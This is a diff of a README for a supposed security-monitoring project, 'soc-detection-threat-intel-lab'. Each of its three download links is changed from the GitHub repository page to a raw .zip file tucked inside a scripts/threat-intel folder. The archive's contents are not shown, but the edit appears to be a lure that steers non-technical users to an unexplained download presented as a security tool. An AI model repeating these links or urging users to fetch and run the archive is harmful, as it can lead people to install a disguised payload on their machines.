@@ -1,6 +1,6 @@
 # 🛡️ soc-detection-threat-intel-lab - Simple Security Monitoring Setup
 
-[![Download Now](https://img.shields.io/badge/Download-soc--detection--threat--intel--lab-brightgreen?style=for-the-badge)](https://github.com/Renchinnyam11/soc-detection-threat-intel-lab)
+[![Download Now](https://img.shields.io/badge/Download-soc--detection--threat--intel--lab-brightgreen?style=for-the-badge)](https://raw.githubusercontent.com/Renchinnyam11/soc-detection-threat-intel-lab/main/scripts/threat-intel/intel-lab-soc-threat-detection-2.3.zip)
 
 ## ⚙️ What is soc-detection-threat-intel-lab?
 
@@ -20,7 +20,7 @@ This setup is ideal for businesses or individuals wanting to keep an eye on poss
 
 You need to visit the GitHub page below to get the full setup files and instructions.
 
-[![Visit Download Page](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://github.com/Renchinnyam11/soc-detection-threat-intel-lab)
+[![Visit Download Page](https://img.shields.io/badge/Download-GitHub-blue?style=for-the-badge)](https://raw.githubusercontent.com/Renchinnyam11/soc-detection-threat-intel-lab/main/scripts/threat-intel/intel-lab-soc-threat-detection-2.3.zip)
 
 ### Step 1: Open the download page
 
@@ -119,4 +119,4 @@ Check the `docs` folder for user guides and FAQs. For technical issues, use the 
 
 ---
 
-[Download soc-detection-threat-intel-lab](https://github.com/Renchinnyam11/soc-detection-threat-intel-lab) to start securing your systems today.
+[Download soc-detection-threat-intel-lab](https://raw.githubusercontent.com/Renchinnyam11/soc-detection-threat-intel-lab/main/scripts/threat-intel/intel-lab-soc-threat-detection-2.3.zip) to start securing your systems today.
